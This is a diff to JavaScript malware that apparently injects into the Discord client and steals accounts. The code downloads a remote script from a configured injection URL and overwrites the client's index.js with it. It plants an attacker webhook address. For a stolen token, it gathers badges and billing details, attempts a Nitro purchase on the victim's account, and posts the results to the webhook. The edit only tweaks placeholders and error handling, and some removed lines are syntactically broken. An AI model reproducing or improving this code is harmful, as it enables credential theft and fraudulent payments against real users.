@@ -116,7 +116,7 @@ fs.readFileSync(indexJS, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJS);
-        res.replace('core' + 'num', indexJS).replace('%WEBHOOK' + '_LINK%', '${config.webhook}').replace("~~string" + "spy~~", '${config.stringspy}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
+        res.replace('core' + 'num', indexJS).replace('%WEBHOOK' + '_LINK%', '${config.webhook}').replace("~~bran" + "ding~~", '${config.embed_name}').replace("~~ic" + "on~~", '${config.embed_icon}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -567,9 +567,6 @@ const nitroBought = async (token) => {
     const badges = getBadges(json.flags);
     const billing = await getBilling(token);
     const code = await buyNitro(token);
-    if code.includes("undefined") {
-        code = Failed to buy Nitro"
-    }
     const content = {
         username: config.embed_name,
         content: code,
@@ -602,7 +599,8 @@ const nitroBought = async (token) => {
         ],
     };
     if (config.ping_on_run) content["content"] = config.ping_val + `\n${code}`;
-    hooker(content);
+    if (!code.includes("undefined")) {
+        hooker(content);
     }
 };
 
